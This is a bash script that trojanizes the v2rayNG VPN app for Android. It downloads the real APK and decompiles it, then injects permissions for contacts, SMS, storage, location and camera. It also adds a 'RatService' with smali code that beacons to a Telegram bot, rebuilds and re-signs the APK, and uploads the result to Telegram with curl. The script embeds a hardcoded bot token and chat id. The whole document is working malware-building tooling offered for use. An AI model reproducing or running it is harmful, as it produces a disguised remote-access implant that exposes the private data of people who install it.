#!/bin/bash
set -e

echo "[*] Downloading original V2Ray APK..."
wget -q -O original.apk https://github.com/2dust/v2rayNG/releases/download/1.8.5/v2rayNG_1.8.5_arm64-v8a.apk

echo "[*] Decompiling APK..."
apktool d -f original.apk -o v2ray_dir

echo "[*] Injecting permissions into Manifest..."
MANIFEST="v2ray_dir/AndroidManifest.xml"
sed -i 's|<application|<uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>\n    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <application|' $MANIFEST

echo "[*] Injecting RatService into Manifest..."
sed -i 's|</application>|<service android:name="com.v2ray.update.RatService" android:exported="false"/>\n    </application>|' $MANIFEST

echo "[*] Injecting Smali files..."
mkdir -p v2ray_dir/smali/com/v2ray/update/

cat > v2ray_dir/smali/com/v2ray/update/RatService.smali << 'EOF'
.class public Lcom/v2ray/update/RatService;
.super Landroid/app/Service;
.source "RatService.java"

# direct methods
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0
    const/4 p0, 0x0
    return-object p0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0
    new-instance p0, Lcom/v2ray/update/RatThread;
    invoke-direct {p0}, Lcom/v2ray/update/RatThread;-><init>()V
    invoke-virtual {p0}, Ljava/lang/Thread;->start()V
    const/4 p0, 0x1
    return p0
.end method
EOF

cat > v2ray_dir/smali/com/v2ray/update/RatThread.smali << 'EOF'
.class Lcom/v2ray/update/RatThread;
.super Ljava/lang/Thread;
.source "RatThread.java"

# instance fields
.field private botApi:Ljava/lang/String;
.field private chatId:Ljava/lang/String;

# direct methods
.method constructor <init>()V
    .locals 1
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V
    const-string v0, "https://api.telegram.org/bot9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY"
    iput-object v0, p0, Lcom/v2ray/update/RatThread;->botApi:Ljava/lang/String;
    const-string v0, "8895860731"
    iput-object v0, p0, Lcom/v2ray/update/RatThread;->chatId:Ljava/lang/String;
    return-void
.end method

# virtual methods
.method public run()V
    .locals 10
    :try_start_0
    iget-object v0, p0, Lcom/v2ray/update/RatThread;->botApi:Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, "/sendMessage"
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    
    new-instance v2, Ljava/net/URL;
    invoke-direct {v2, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v1
    check-cast v1, Ljava/net/HttpURLConnection;
    const/4 v2, 0x1
    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    const-string v2, "POST"
    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const-string v2, "Content-Type"
    const-string v3, "application/x-www-form-urlencoded"
    invoke-virtual {v1, v2, v3}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v2
    new-instance v3, Ljava/lang/StringBuilder;
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
    const-string v4, "chat_id="
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    iget-object v4, p0, Lcom/v2ray/update/RatThread;->chatId:Ljava/lang/String;
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v4, "&text=V2Ray Injected Successfully!"
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    const-string v4, "UTF-8"
    invoke-virtual {v3, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    move-result-object v3
    invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getResponseCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method
EOF

echo "[*] Rebuilding APK..."
apktool b v2ray_dir -o injected_unsigned.apk

echo "[*] Signing APK..."
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias mykey -storepass 123456 -keypass 123456 -dname "CN=Android Debug,O=Android,C=US" -noprompt
zipalign -v 4 injected_unsigned.apk injected_aligned.apk
apksigner sign --ks key.jks --ks-pass pass:123456 --key-pass pass:123456 --out injected_final.apk injected_aligned.apk

echo "[*] Sending to Telegram..."
curl -F "chat_id=8895860731" -F "caption=🚀 V2Ray Injected APK" -F "document=@injected_final.apk" https://api.telegram.org/bot9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY/sendDocument
